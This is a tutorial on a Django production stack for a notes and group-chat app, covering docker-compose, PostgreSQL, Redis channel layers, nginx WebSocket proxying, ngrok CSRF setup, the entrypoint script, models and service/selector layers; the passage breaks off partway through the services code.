# CrispyNotes — Final Project: Production Stack

> This tutorial walks you through a **full production-ready stack**:
> PostgreSQL → Django → Redis → Channels → nginx → ngrok.
>
> The project — `notes_chat_app` — combines all the previous modules:
> templates + auth + tests + async + WebSocket + Docker + nginx.
> You'll see how all the components work together in a real system.
>
> **Result:** an application with PostgreSQL, a real-time group chat,
> Selenium E2E tests and public access through ngrok.

---

## Contents

**Architecture** _(read before the code)_
- [01 · OVERVIEW — what and why in a production stack](#01--overview)
- [02 · DOCKER COMPOSE — the chain of services and dependencies](#02--docker-compose)
- [03 · POSTGRESQL — from SQLite to a production DB](#03--postgresql)
- [04 · REDIS + CHANNELS — the channel layer for WebSocket](#04--redis--channels)
- [05 · NGINX — reverse proxy and static files](#05--nginx)
- [06 · NGROK — public access and CSRF](#06--ngrok)
- [07 · ENTRYPOINT — the container startup chain](#07--entrypoint)

**Models and domain logic**
- [08 · MODELS — the full data schema](#08--models)
- [09 · SERVICES + SELECTORS — the business logic layer](#09--services--selectors)
- [10 · CONSUMERS — WebSocket group chat](#10--consumers)

**Tests and quality**
- [11 · TEST STRATEGY — 5 levels of verification](#11--test-strategy)
- [12 · SELENIUM IN DOCKER — E2E via Remote WebDriver](#12--selenium-in-docker)

**Development and deployment**
- [13 · SEED DATA — demo data for development](#13--seed-data)
- [14 · DEVELOPMENT — workflows and commands](#14--development)
- [15 · PRODUCTION CHECKLIST — what to check before a release](#15--production-checklist)

---

## 01 · OVERVIEW

> **The main question:** How is `notes_chat_app` different from the previous lessons?
>
> In the previous lessons — SQLite, `runserver`, no nginx, no Redis.
> Here — a production stack. The same Django logic, but under real load.

### Components of the production stack

```
┌─────────────────────────────────────────────────────────────────┐
│  Internet (via ngrok)  ←────────────────────────────────┐       │
│                                                          │       │
│  Browser                                                 │       │
│      │                                                   │       │
│      ▼                                                   │       │
│  nginx :80  ← SSL termination, static files             │       │
│      │                                                   │       │
│      ├── GET /static/*  →  /staticfiles/ (volume)       │       │
│      └── everything else  →  web:8001                   │       │
│                   │                                      │       │
│                   ▼                                      │       │
│           Uvicorn ASGI :8001                             │       │
│                   │                                      │       │
│           ProtocolTypeRouter                             │       │
│                   │                                      │       │
│           ├── HTTP  → Django views                       │       │
│           └── WS   → GroupChatConsumer                  │       │
│                            │                             │       │
│                            ├── PostgreSQL :5432          │       │
│                            └── Redis :6379 (channel)    │       │
│                                                          │       │
│  ngrok ─────────────────────────────────────────────────┘       │
│  Selenium :4444 ← E2E tests                                     │
└─────────────────────────────────────────────────────────────────┘
```

### Services table

| Service | Image | Port | Role |
|--------|-------|------|------|
| `db` | `postgres:16-alpine` | 5432 | Relational DB |
| `redis` | `redis:7-alpine` | 6379 | Channel layer (WebSocket pub/sub) |
| `web` | `Dockerfile` | 8001 | Django + Uvicorn ASGI |
| `nginx` | `nginx:1.27-alpine` | 80 | Reverse proxy, static files |
| `ngrok` | `ngrok/ngrok` | 4040 | Public HTTPS tunnel |
| `selenium` | `selenium/standalone-chrome` | 4444 | Headless Chrome for E2E |

### Why the production stack is more complex

| | Dev (previous lessons) | Production (this lesson) |
|--|----------------------|----------------------|
| **DB** | SQLite (a file) | PostgreSQL (a container) |
| **Server** | `runserver` (WSGI) | Uvicorn (ASGI) |
| **Proxy** | — | nginx (static files, WebSocket) |
| **Channel layer** | InMemory | Redis (scales) |
| **Public access** | — | ngrok (HTTPS tunnel) |
| **Startup** | `python manage.py runserver` | `docker compose up` |

---

## 02 · DOCKER COMPOSE

> **Key concept:** health checks and `depends_on: condition: service_healthy`
> guarantee that each service waits for the previous one to be ready before starting.

### Full dependency diagram

```
db (postgres)          → healthy?
    │
redis (redis)          → healthy?
    │
    └──────────────────────────┐
                               ▼
                         web (django + uvicorn)
                               │
                               → migrate
                               → collectstatic
                               → seed_demo_data (if SEED_DEMO_DATA=1)
                               → uvicorn start
                               │
                         web healthy?
                               │
                        nginx (reverse proxy)
                               │
                         nginx healthy?
                               │
                        ngrok (public tunnel)
                               │
                        selenium (e2e tests chrome)
```

### docker-compose.yml — a detailed breakdown

```yaml
services:

  # ─── PostgreSQL ──────────────────────────────────────────────────────
  db:
    image: postgres:16-alpine     # minimal image (alpine = ~80 MB)
    volumes:
      - postgres_data:/var/lib/postgresql/data  # data persists between restarts
    environment:
      POSTGRES_DB:       ${POSTGRES_DB}
      POSTGRES_USER:     ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER} -d ${POSTGRES_DB}"]
      # pg_isready: a PostgreSQL utility — checks whether the server accepts connections
      interval: 5s      # check every 5 sec
      retries: 5         # consider it "healthy" after 5 successful ones
    networks: [app-net]

  # ─── Redis ───────────────────────────────────────────────────────────
  redis:
    image: redis:7-alpine
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]   # PONG = redis is alive
      interval: 5s
    networks: [app-net]

  # ─── Web (Django) ────────────────────────────────────────────────────
  web:
    build: .             # Dockerfile in the current directory
    ports:
      - "8001:8001"      # direct access for Selenium (tests don't go through nginx)
    environment:
      DATABASE_URL:  postgres://${POSTGRES_USER}:${POSTGRES_PASSWORD}@db:5432/${POSTGRES_DB}
      REDIS_URL:     redis://redis:6379/0
      SECRET_KEY:    ${SECRET_KEY}
      DEBUG:         ${DEBUG:-False}
      ALLOWED_HOSTS: ${ALLOWED_HOSTS:-localhost,127.0.0.1}
      NGROK_DOMAIN:  ${NGROK_DOMAIN}
      SEED_DEMO_DATA: ${SEED_DEMO_DATA:-0}
      WEB_HOST:      web              # for the Selenium Docker network
      SELENIUM_REMOTE_URL: http://selenium:4444/wd/hub
    volumes:
      - staticfiles:/app/staticfiles   # web writes → nginx reads
    depends_on:
      db:    {condition: service_healthy}
      redis: {condition: service_healthy}
    healthcheck:
      test: >
        python -c "import urllib.request;
        urllib.request.urlopen('http://localhost:8001/accounts/login/')"
      interval: 5s
      retries: 12
      start_period: 15s   # the first health check 15 sec after start
    networks: [app-net]

  # ─── Nginx ───────────────────────────────────────────────────────────
  nginx:
    image: nginx:1.27-alpine
    ports: ["80:80"]
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro   # config (read-only)
      - staticfiles:/staticfiles:ro                   # static files (read-only)
    depends_on:
      web: {condition: service_healthy}
    healthcheck:
      test: ["CMD-SHELL", "curl -sf http://localhost/accounts/login/ || exit 1"]
      interval: 10s
    networks: [app-net]

  # ─── Ngrok ───────────────────────────────────────────────────────────
  ngrok:
    image: ngrok/ngrok:latest
    command: http --url=${NGROK_DOMAIN} nginx:80
    # ↑ a tunnel from the public URL to nginx inside the Docker network
    environment:
      NGROK_AUTHTOKEN: ${NGROK_AUTHTOKEN}
    ports: ["4040:4040"]   # ngrok dashboard (traffic inspector)
    depends_on:
      nginx: {condition: service_healthy}
    networks: [app-net]

  # ─── Selenium ────────────────────────────────────────────────────────
  selenium:
    image: selenium/standalone-chrome:latest
    ports:
      - "4444:4444"    # WebDriver API (used by test_selenium.py)
      - "7900:7900"    # VNC (you can watch the browser live: http://localhost:7900)
    shm_size: '2g'     # Chrome needs shared memory
    networks: [app-net]

# ─── Named volumes ───────────────────────────────────────────────────────
volumes:
  postgres_data:    # PostgreSQL data (persists between docker compose down/up)
  staticfiles:      # Django collectstatic output (web → nginx)

# ─── Named network ───────────────────────────────────────────────────────
networks:
  app-net:
    driver: bridge
    # An explicit network guarantees DNS resolution between containers:
    # "nginx" → IP of the nginx container, "redis" → IP of the redis container, etc.
    # Without an explicit network ngrok may not find "nginx" → ERR_NGROK_8012
```

### Why `start_period` in the healthcheck matters

```
start_period: 15s  for web:

  0s   → the container started
  0–15s → entrypoint.sh: migrate + collectstatic + seed_demo_data
         The healthcheck isn't counted! (not considered a failure)
  15s  → real checks start every 5s
  60s  → if all 12 attempts failed → the service is "unhealthy"
         nginx doesn't start (depends_on: service_healthy)

Without start_period: the healthcheck counts 12 attempts from the first second.
If migrate takes 10s → nginx tries to start → 503 → ngrok can't reach it.
```

---

## 03 · POSTGRESQL

> **The key difference from SQLite:** PostgreSQL is a separate service on the network.
> Django connects via `DATABASE_URL` (dj-database-url parses the connection string).

### How Django connects to PostgreSQL

```python
# settings.py
import dj_database_url
import os

DATABASE_URL = os.environ.get('DATABASE_URL')

if DATABASE_URL:
    # Production: PostgreSQL in Docker
    DATABASES = {'default': dj_database_url.parse(DATABASE_URL)}
    # dj_database_url.parse converts:
    # 'postgres://notes_user:pass@db:5432/notes_db'
    # into:
    # {'ENGINE': 'django.db.backends.postgresql',
    #  'HOST': 'db', 'PORT': '5432', 'NAME': 'notes_db',
    #  'USER': 'notes_user', 'PASSWORD': 'pass'}
else:
    # Dev/CI: SQLite (doesn't need a server)
    DATABASES = {'default': {'ENGINE': 'django.db.backends.sqlite3',
                             'NAME': BASE_DIR / 'db.sqlite3'}}
```

### Why not SQLite in production

| | SQLite | PostgreSQL |
|--|--------|-----------|
| **Concurrent writes** | One writer, file locking | MVCC — thousands of writers |
| **WebSocket + ORM** | Conflicts with concurrent WS | No conflicts |
| **Transactions** | Limited | Full ACID + SERIALIZABLE |
| **Indexing** | Basic | GIN, GiST, partial indexes |
| **Scale** | ~100K rows comfortably | Billions of rows |
| **Docker** | A file in the container (gets lost!) | A separate service + volume |

**The critical problem with SQLite in Docker:**

```
Without a named volume:
  docker compose down → the container is removed → db.sqlite3 is removed
  docker compose up   → a new DB → all data is lost!

With PostgreSQL + a named volume:
  docker compose down → the container is removed → the postgres_data volume remains
  docker compose up   → PostgreSQL attaches to the volume → the data is preserved
```

### Migrations in Docker

```bash
# Automatically on startup (entrypoint.sh):
python manage.py migrate --noinput

# Manually (if you need to apply them without a restart):
docker compose exec web python manage.py migrate

# Check the migration state:
docker compose exec web python manage.py showmigrations

# Connect to PostgreSQL directly:
docker compose exec db psql -U notes_user -d notes_db

# View tables:
\dt
\d notes_app_note    # schema of a specific table
```

### CONN_MAX_AGE — persistent connections

```python
# settings.py
DATABASES = {
    'default': {
        ...,
        'CONN_MAX_AGE': 0,  # async-compatible: 0 = new connections every time
    }
}
# CONN_MAX_AGE > 0 requires thread-local storage → incompatible with async views
# With ASGI/Uvicorn → CONN_MAX_AGE = 0 (Django recommendation)
```

---

## 04 · REDIS + CHANNELS

> **The problem with InMemoryChannelLayer:** it stores messages in the RAM of a single process.
> If you run 2 uvicorn workers → they don't see each other → the broadcast won't arrive.
> The Redis channel layer solves this through shared pub/sub.

### How RedisChannelLayer implements broadcast

```
Worker 1 (Viktor's Consumer)         Worker 2 (Olya's Consumer)
┌────────────────────────┐           ┌────────────────────────┐
│  group_send(            │           │                        │
│    "chat_group_7", ... │──────────►│  Redis pub/sub         │
│  )                      │           │  channel: chat_group_7 │
└────────────────────────┘           │         │              │
                                     │         ▼              │
                                     │  chat_message()        │
                                     │  send() → Olya's browser│
                                     └────────────────────────┘

Redis as a shared message broker:
  Publish: Viktor's Consumer → Redis LPUSH chat_group_7_msgs ...
  Subscribe: Olya's Consumer ← Redis BRPOP chat_group_7_msgs
```

### Channel layer configuration

```python
# settings.py
_REDIS_URL = os.environ.get('REDIS_URL')

if _REDIS_URL:
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels_redis.core.RedisChannelLayer",
            "CONFIG": {
                "hosts": [{
                    "address": _REDIS_URL,
                    # socket_timeout=None: no limit on reads
                    # (important for long-lived WS connections!)
                    "socket_timeout": None,
                    "socket_connect_timeout": 5,
                    # health_check_interval: Redis pings every 30 sec
                    # to detect and restore broken connections
                    "health_check_interval": 30,
                }],
            },
        }
    }
else:
    # Local dev without Docker — InMemory (a single process at a time)
    CHANNEL_LAYERS = {
        "default": {"BACKEND": "channels.layers.InMemoryChannelLayer"}
    }
```

**Why `socket_timeout=None` is critical:**

```
The problem without socket_timeout=None:

  GroupChatConsumer.receive()
    → channel_layer.group_send()   ← publishes to Redis
    → channel_layer subscribes for the response

  Redis responds via brpop_timeout=5 seconds
  But if socket_timeout=5 (or less) in the Redis client:
    client-side timeout < server brpop timeout
    → redis.exceptions.TimeoutError
    → ASGI application ERROR
    → the WebSocket connection drops

  Symptom: the nginx log shows 101 (WS upgrade), then a minute later:
    "Exception in ASGI application → TimeoutError reading from redis:6379"

  Solution: socket_timeout=None → reads without a time limit
  brpop_timeout on the server (5 sec) is the natural limit
```

### daphne first in INSTALLED_APPS

```python
# settings.py
INSTALLED_APPS = [
    'daphne',    # ← FIRST! Overrides runserver → ASGI instead of WSGI
    'channels',
    'django.contrib.admin',
    # ...
    'notes_app',
]

ASGI_APPLICATION = 'notes_project.asgi.application'
```

**What happens if daphne is NOT first:**

```bash
python manage.py runserver
# → Django uses the built-in WSGI server
# → WebSocket URL /ws/... → 404
# → GroupChatConsumer is unreachable
# → The group chat doesn't work

python manage.py runserver
# + daphne first:
# → daphne overrides the runserver command
# → ASGI server with an asyncio event loop
# → WebSocket + HTTP at the same time ✓
```

---

## 05 · NGINX

> **Nginx as a reverse proxy:** the browser doesn't connect to Uvicorn directly.
> Nginx accepts connections, terminates SSL, serves static files, and proxies the rest.

### nginx architecture in this stack

```
Browser → nginx:80 → routing:

  GET /static/css/main.css
    → alias /staticfiles/css/main.css   ← from the volume, without Django
    → 200 with Cache-Control: max-age=604800

  GET /notes/
    → proxy_pass http://web:8001/notes/  ← HTTP to Uvicorn
    → Django view → HTML → nginx → browser

  WebSocket UPGRADE /ws/groups/7/chat/
    → proxy_http_version 1.1
    → proxy_set_header Upgrade $http_upgrade    ← MANDATORY!
    → proxy_set_header Connection $connection_upgrade
    → proxy_pass http://web:8001/ws/groups/7/chat/
    → Uvicorn ASGI → GroupChatConsumer → persistent
```

### nginx.conf — complete, with comments

```nginx
worker_processes auto;   # auto = number of CPU cores

events {
    worker_connections 1024;   # simultaneous connections per worker process
    # 2 cores × 1024 = 2048 simultaneous connections
}

http {
    include /etc/nginx/mime.types;   # .css → text/css, .js → application/javascript

    # ── WebSocket Upgrade handling ────────────────────────────────────────────
    # $http_upgrade = the "Upgrade" header from the browser ("websocket" or "")
    # If the browser sends Upgrade: websocket → $connection_upgrade = "upgrade"
    # If it's a regular HTTP request (Upgrade = "") → $connection_upgrade = "close"
    map $http_upgrade $connection_upgrade {
        default upgrade;
        ""      close;
    }

    # ── Upstream: Django/Uvicorn ──────────────────────────────────────────────
    upstream django {
        server web:8001;   # "web" — the DNS name of the service in the Docker network app-net
        # You can add several: server web2:8001; → load balancing
    }

    server {
        listen 80;
        # In production: listen 443 ssl; + ssl_certificate

        client_max_body_size 10M;   # maximum upload size (forms with files)

        # ── Static files (nginx serves them directly) ────────────────────────
        location /static/ {
            alias /staticfiles/;   # volume from collectstatic (web → nginx)
            expires 7d;            # the browser caches for 7 days
            add_header Cache-Control "public, immutable";
            # "immutable": the browser doesn't check freshness (files have a hash in their names)
        }

        # ── Everything else → Uvicorn ────────────────────────────────────────
        location / {
            proxy_pass http://django;

            # The real client IP (without these headers Django sees the nginx IP):
            proxy_set_header Host              $host;
            proxy_set_header X-Real-IP         $remote_addr;
            proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;

            # ── WEBSOCKET UPGRADE (critical!) ─────────────────────────────
            proxy_http_version 1.1;
            # ↑ WebSocket requires HTTP/1.1 (connection keep-alive)
            # Without this nginx downgrades to HTTP/1.0 → Upgrade headers are ignored
            # → WS handshake fails → the browser gets 400 or 101 and then an immediate close

            proxy_set_header Upgrade    $http_upgrade;
            proxy_set_header Connection $connection_upgrade;
            # ↑ We pass Upgrade: websocket and Connection: upgrade to Uvicorn
            # Uvicorn sees these headers → switches protocols → ASGI WS scope

            proxy_read_timeout 300s;    # a WS connection can live 5 minutes without activity
            proxy_connect_timeout 75s;  # limit for establishing a connection to the upstream
            proxy_send_timeout 300s;    # limit for sending the response to the client
        }
    }
}
```

### How staticfiles gets to nginx

```
1. Dockerfile COPY . .
   → the whole project in /app/

2. entrypoint.sh:
   python manage.py collectstatic --noinput
   → Django collects all static files into STATIC_ROOT (/app/staticfiles/)
   → CSS from crispy_forms, JS, admin, icons — all in one place

3. docker-compose.yml:
   web:   volumes: - staticfiles:/app/staticfiles   ← web WRITES here
   nginx: volumes: - staticfiles:/staticfiles:ro    ← nginx READS here (read-only!)

4. nginx.conf:
   location /static/ { alias /staticfiles/; }      ← nginx → volume → file

→ GET /static/admin/css/base.css
  → nginx → /staticfiles/admin/css/base.css
  → 200 without Python!
```

---

## 06 · NGROK

> **Why ngrok:** `localhost:80` is not reachable from the internet.
> ngrok creates a public HTTPS URL that tunnels to your nginx.

### ngrok in Docker Compose

```yaml
ngrok:
  image: ngrok/ngrok:latest
  command: http --url=${NGROK_DOMAIN} nginx:80
  # ↑ "http" = HTTP tunnel (ngrok adds HTTPS on the client side)
  # --url: a fixed domain (requires ngrok Pro or a static domain)
  # nginx:80 = where to forward the traffic (Docker internal DNS)
  environment:
    NGROK_AUTHTOKEN: ${NGROK_AUTHTOKEN}
  ports:
    - "4040:4040"   # ngrok web UI: inspect HTTP traffic
  depends_on:
    nginx: {condition: service_healthy}   # wait for nginx
```

### Problem: CSRF + ngrok

**Symptom:** you opened `https://my-domain.ngrok-free.app/accounts/login/`, entered credentials → `403 Forbidden: CSRF verification failed`.

**Diagnosis:** ngrok adds the header `Origin: https://my-domain.ngrok-free.app`. Django checks `CSRF_TRUSTED_ORIGINS`. If the domain isn't there → 403.

```python
# settings.py
_ngrok_domain = os.environ.get('NGROK_DOMAIN', '')

CSRF_TRUSTED_ORIGINS = (
    [f'https://{_ngrok_domain}']
    if _ngrok_domain else []
)
# CSRF_TRUSTED_ORIGINS = ['https://fawn-natural-mayfly.ngrok-free.app']

# You also need to allow the domain in ALLOWED_HOSTS:
_allowed = os.environ.get('ALLOWED_HOSTS', 'localhost,127.0.0.1')
ALLOWED_HOSTS = [h.strip() for h in _allowed.split(',')]
# + add the ngrok domain:
if _ngrok_domain:
    ALLOWED_HOSTS.append(_ngrok_domain)
```

**In docker-compose.yml:**

```yaml
web:
  environment:
    NGROK_DOMAIN: ${NGROK_DOMAIN}   # pass it from .env into the container
```

**In .env:**

```bash
NGROK_DOMAIN=fawn-natural-mayfly.ngrok-free.app
NGROK_AUTHTOKEN=2abc123_your_real_token_here
```

### Problem: ERR_NGROK_8012 — no such host nginx

**Symptom:** ngrok starts but shows `ERR_NGROK_8012: failed to connect to upstream: no such host nginx`.

**Cause:** the ngrok container can't find nginx by its DNS name. Usually because there's no shared network.

```yaml
# Solution: an explicit named network on ALL services
networks:
  app-net:
    driver: bridge

services:
  nginx:
    networks: [app-net]
  ngrok:
    networks: [app-net]   # ← both in app-net → DNS resolution of "nginx" ✓
```

### ngrok dashboard

```
http://localhost:4040   ← ngrok web UI

Lets you:
  - View all HTTP requests through the tunnel in real time
  - See request and response headers
  - See the request body (JSON, forms)
  - Replay requests (reproduce the same POST again)
  - Check the CSRF token in the cookie and the POST body

Useful for debugging CSRF: open Inspector → POST /accounts/login/
  → Cookies: csrftoken=<value>
  → Body: csrfmiddlewaretoken=<value>
  → Do they match?
```

---

## 07 · ENTRYPOINT

> **entrypoint.sh** is a shell script that runs on every `docker compose up`.
> It runs the preparation steps and then uvicorn.

```sh
#!/bin/sh
set -e   # stop on any error (exit code ≠ 0)
# Without set -e: uvicorn starts even if migrate failed → 500 on every request

echo "=== Running migrations ==="
python manage.py migrate --noinput
# --noinput: don't ask for confirmation in interactive mode
# Applies all new migrations since the previous code version

echo "=== Collecting static files ==="
python manage.py collectstatic --noinput
# Collects static files from all installed apps into STATIC_ROOT (/app/staticfiles)
# Needed on every deploy (if CSS/JS changed)

echo "=== Seeding demo data (if enabled) ==="
if [ "${SEED_DEMO_DATA}" = "1" ]; then
    python manage.py seed_demo_data --force
    # --force: without confirmation, even if the DB isn't empty
fi

echo "=== Starting uvicorn ==="
exec python -m uvicorn notes_project.asgi:application \
    --host 0.0.0.0 \
    --port 8001 \
    --reload
    # --reload: auto-restart on file changes (DEV ONLY!)
    # In production: remove --reload + add --workers 4

# exec: replaces the shell process with uvicorn
# Without exec: shell → uvicorn as a child process
# SIGTERM from Docker → shell → the shell may ignore it → uvicorn doesn't get the signal
# With exec: SIGTERM → uvicorn → graceful shutdown ✓
```

**The `set -e` chain in action:**

```
✅ Normal startup:
  migrate OK → collectstatic OK → seed OK → uvicorn START

❌ If migrate failed (for example, PostgreSQL isn't ready yet):
  migrate FAIL (exit 1) → set -e → shell EXIT
  entrypoint returns exit 1
  → Docker: the container exited with an error → "Exited (1)"
  → nginx does NOT start (depends_on: service_healthy)
  → A clear error in the logs instead of mysterious 500s
```

---

## 08 · MODELS

> **The notes_app data schema:** 10 tables, 4 levels of relationships.

### ER diagram

```
┌──────────────────────────────────────────────────────────────────────────┐
│  auth_user (Django built-in)                                              │
│  id, username, email, password (PBKDF2), is_active, is_staff...           │
└──────────┬────────────────────────────────────────────────────────────────┘
           │ 1:1
           ▼
┌──────────────────┐
│   UserProfile    │
│──────────────────│
│ user (OneToOne)  │
│ bio (TextField)  │
│ avatar (URL)     │
└──────────────────┘

           │ (auth_user)
           │ 1:N ──────────────────────────────────────────────────────────
           ▼                                                                │
┌──────────────────────┐     1:N    ┌───────────────────┐                  │
│       Notebook       │◄──────────►│       Note        │                  │
│──────────────────────│            │───────────────────│                  │
│ user (FK→User)       │            │ user (FK→User)    │                  │
│ title (200)          │            │ notebook (FK SET)  │                  │
│ color (#hex)         │            │ group (FK SET_NULL)│                  │
│ is_default (bool)    │            │ title (200)       │                  │
└──────────────────────┘            │ content (text)    │                  │
                                    │ priority (1-4)    │◄─────── M:N ───► Tag
                                    │ is_pinned (bool)  │                  │
                                    │ is_archived (bool)│                  │
                                    │ created_at (auto) │                  │
                                    │ updated_at (auto) │                  │
                                    └───────────┬───────┘                  │
                                                │ 1:N                       │
                                                ▼                          │
                                    ┌───────────────────┐                  │
                                    │     Reminder      │                  │
                                    │───────────────────│                  │
                                    │ note (FK CASCADE)  │                  │
                                    │ remind_at (DT)    │                  │
                                    │ is_sent (bool)    │                  │
                                    └───────────────────┘                  │
                                                                           │
           │ (auth_user)                                                   │
           │ 1:N                                                           │
           ▼                                                               ▼
┌──────────────────────┐     1:N    ┌──────────────────────┐   ┌──────────────────┐
│       TodoList       │◄──────────►│      TodoItem        │   │       Tag        │
│──────────────────────│            │──────────────────────│   │──────────────────│
│ user (FK)            │            │ todo_list (FK CASCADE)│   │ user (FK)        │
│ title (200)          │            │ text (500)            │   │ name (50)        │
│ is_completed (bool)  │            │ is_done (bool)        │   │ color (#hex)     │
└──────────────────────┘            │ due_date (date/null)  │   │ unique (user,name)│
                                    │ order_position (int)  │   └──────────────────┘
                                    └──────────────────────┘

           │ (auth_user)
           │ 1:N
           ▼
┌──────────────────────┐     1:N    ┌──────────────────────┐
│    ShoppingList      │◄──────────►│     ShopItem         │
│──────────────────────│            │──────────────────────│
│ user (FK)            │            │ shopping_list (FK CASCADE)│
│ group (FK SET_NULL)  │            │ name (200)            │
│ title (200)          │            │ quantity (decimal 8,2)│
│ store_name (100)     │            │ is_purchased (bool)   │
└──────────────────────┘            │ unit (шт/кг/л/г)     │
                                    │ estimated_price (null)│
                                    └──────────────────────┘

  auth_group (Django built-in)
  ↕ M:N with auth_user (via auth_user_groups)
  ↕ FK from Note.group and ShoppingList.group

  ChatMessage
  ┌──────────────────┐
  │   ChatMessage    │
  │──────────────────│
  │ group (FK CASCADE)│  ← group deleted → chat deleted
  │ author (FK CASCADE)│ ← author deleted → msg deleted
  │ content (text)   │
  │ timestamp (auto) │
  └──────────────────┘
```

### Key decisions in the models

**Note.priority — validators vs CheckConstraint:**

```python
class Note(models.Model):
    PRIORITY_CHOICES = [(1, 'Низький'), (2, 'Середній'), (3, 'Високий'), (4, 'Критичний')]

    priority = models.PositiveSmallIntegerField(
        default=1,
        validators=[MinValueValidator(1), MaxValueValidator(4)],
        # ↑ validators: triggered on full_clean() and ModelForm
        # NOT triggered on .objects.create() or .save() directly!
    )

    class Meta:
        constraints = [
            models.CheckConstraint(
                check=Q(priority__gte=1) & Q(priority__lte=4),
                name='note_priority_range',
            )
        ]
        # ↑ CheckConstraint: DB-level validation (PostgreSQL CHECK constraint)
        # Triggered on ANY INSERT/UPDATE, even through raw SQL
        # The "last line of defense"
```

**Note.group FK — SET_NULL vs CASCADE:**

```python
group = models.ForeignKey(
    Group,
    on_delete=models.SET_NULL,   # ← NOT CASCADE!
    null=True, blank=True,
    related_name='notes',
)
# SET_NULL: group deleted → the note stays, group=NULL
# CASCADE:  group deleted → ALL of the group's notes are deleted!
#           A user deletes a group → loses their notes → rage quit

# A test that documents and protects this behavior:
def test_note_group_becomes_null_when_group_deleted(self):
    group = Group.objects.create(name='Family')
    note = Note.objects.create(user=self.user, title='Test', group=group)
    group.delete()
    note.refresh_from_db()
    self.assertIsNone(note.group)  # SET_NULL worked
```

**unique_together vs UniqueConstraint:**

```python
class Tag(models.Model):
    name = models.CharField(max_length=50)
    user = models.ForeignKey(User, on_delete=models.CASCADE)

    class Meta:
        # Old version (deprecating):
        # unique_together = [('user', 'name')]

        # New version (Django 4+):
        constraints = [
            models.UniqueConstraint(
                fields=['user', 'name'],
                name='tag_unique_per_user',
            )
        ]
        # Business rule: 'python' can exist for Alice AND for Bob
        # But one user can't have two 'python' tags
```

**ChatMessage — both FKs use CASCADE:**

```python
class ChatMessage(models.Model):
    group = models.ForeignKey(
        Group,
        on_delete=models.CASCADE,    # ← CASCADE: group deleted → the whole chat is deleted
        related_name='chat_messages',
    )
    author = models.ForeignKey(
        User,
        on_delete=models.CASCADE,    # ← CASCADE: user deleted → their messages are deleted
        related_name='chat_messages',
    )
    content = models.TextField()
    timestamp = models.DateTimeField(auto_now_add=True)
    # auto_now_add: set automatically on CREATE, never changes

    class Meta:
        ordering = ['timestamp']   # chronological order by default
        indexes = [
            models.Index(fields=['group', 'timestamp']),
            # ↑ Composite index for fast retrieval of a group's messages
            # GROUP BY group, ORDER BY timestamp → index scan instead of seq scan
        ]
```

---

## 09 · SERVICES + SELECTORS

> **Pattern:** views are thin. All the logic lives in two layers.
> Selectors — reads only (SELECT). Services — mutations (INSERT/UPDATE/DELETE).

### Layer architecture

```
HTTP Request
    │
    ▼
views.py  ← thin layer: auth, form validation, redirect
    │
    ├── selectors.py  ← SELECT only, returns a QuerySet or a list
    └── services.py   ← INSERT/UPDATE/DELETE, business logic

selectors.py and services.py do NOT import each other.
Only views.py uses both.
```

### selectors.py — key queries

```python
# notes_app/selectors.py
from django.db.models import Q, Count, Prefetch
from .models import Note, Notebook, Tag, ChatMessage


def get_user_notes(user, *, archived=False, notebook=None, tag=None, search=None):
    """
    Returns the user's notes + notes of the groups they are a member of.

    SELECT n.* FROM note n
    LEFT JOIN auth_user_groups ug ON ug.group_id = n.group_id
    WHERE (n.user_id = %s OR ug.user_id = %s)
    AND n.is_archived = %s
    [AND n.notebook_id = %s]
    [AND n.tags CONTAINS %s]
    [AND (n.title ILIKE %s OR n.content ILIKE %s)]
    ORDER BY n.is_pinned DESC, n.priority DESC, n.updated_at DESC
    """
    user_groups = user.groups.all()   # prefetch groups (one SQL query)

    qs = Note.objects.filter(
        Q(user=user) | Q(group__in=user_groups),
        is_archived=archived,
    ).select_related(
        'notebook',    # JOIN notebook → no N+1 when displaying the notebook color
        'group',       # JOIN group → no N+1 when displaying the group name
    ).prefetch_related(
        'tags',        # IN tags → no N+1 when displaying tags
    )

    if notebook is not None:
        qs = qs.filter(notebook=notebook)
    if tag is not None:
        qs = qs.filter(tags=tag)
    if search:
        qs = qs.filter(
            Q(title__icontains=search) | Q(content__icontains=search)
        )

    return qs.order_by('-is_pinned', '-priority', '-updated_at')


def get_user_notebooks(user):
    """The user's notebooks with note counts (for the sidebar)."""
    return Notebook.objects.filter(user=user).annotate(
        note_count=Count('notes', filter=Q(notes__is_archived=False))
        # annotate: adds a note_count field to each object of the QuerySet
        # filter inside Count: only non-archived ones
        # Without filter: counts all notes including the archive
    ).order_by('-is_default', 'title')


def get_user_tags(user):
    """The user's tags for the sidebar and forms."""
    return Tag.objects.filter(user=user).order_by('name')


def get_chat_history(group_pk, limit=50):
    """
    The group's last 50 messages in chronological order.

    SELECT cm.*, au.username as author__username
    FROM chatmessage cm
    LEFT JOIN auth_user au ON cm.author_id = au.id
    WHERE cm.group_id = %s
    ORDER BY cm.timestamp DESC
    LIMIT 50
    [reverse() in Python]
    """
    return (
        ChatMessage.objects
        .filter(group_id=group_pk)
        .select_related('author')
        .order_by('-timestamp')[:limit]
        # A slice of the QuerySet: PostgreSQL LIMIT 50
    )
    # NOTE: the Consumer calls this function via database_sync_to_async
    # and materializes it into a list: list(qs.values(...)) inside the sync thread
```

### services.py — key services

```python
# notes_app/services.py
from django.db import transaction
from .models import Note, Notebook, Tag


def create_note(*, user, title, content='', priority=1,
                notebook=None, tag_ids=None, group=None,
                is_pinned=False):
    """
    Creates a note and attaches tags.

    An atomic operation: if tags.set() fails → the note is rolled back too.
    """
    with transaction.atomic():
        note = Note.objects.create(
            user=user,
            title=title,
            content=content,
            priority=priority,
            notebook=notebook,
            group=group,
            is_pinned=is_pinned,
        )

        if tag_ids:
            # Security: filter(user=user) blocks other users' tags
            # POST /notes/new/ {tag_ids: [bob_secret_tag_id]} → won't be attached
            valid_tags = Tag.objects.filter(id__in=tag_ids, user=user)
            note.tags.set(valid_tags)

    return note


def create_notebook(*, user, title, color='#6c757d', is_default=False):
    """
    Creates a notebook. Business rule: only ONE default per user.

    transaction.atomic(): if CREATE fails after UPDATE → both are rolled back.
    """
    with transaction.atomic():
        if is_default:
            # First reset all existing defaults of ONLY this user
            Notebook.objects.filter(user=user, is_default=True).update(is_default=False)
